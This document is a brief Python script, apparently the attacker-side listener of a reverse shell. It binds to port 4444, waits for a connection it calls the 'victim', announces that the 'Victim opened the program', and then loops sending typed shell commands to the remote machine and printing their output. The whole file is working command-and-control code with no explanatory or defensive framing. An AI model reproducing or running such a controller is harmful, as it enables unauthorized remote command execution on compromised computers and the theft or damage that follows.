#!/usr/bin/python3

import socket

my_ip = "127.0.0.1"
port = 4444
server = socket.socket()
server.bind((my_ip, port))
print('[+] Server Started')
print('[+] Listening for connections')
server.listen(1)
victim, victim_addr = server.accept()
print(victim)
print(victim_addr)
print('[+]' + victim_addr[0] + 'Victim opened the program')

while True:
    command = input('Enter Command >> ')
    command = command.encode()
    victim.send(command)
    print('[+] Command sent')
    output = victim.recv(1024)
    output = output.decode(errors="ignore")
    print("Output: " + output)
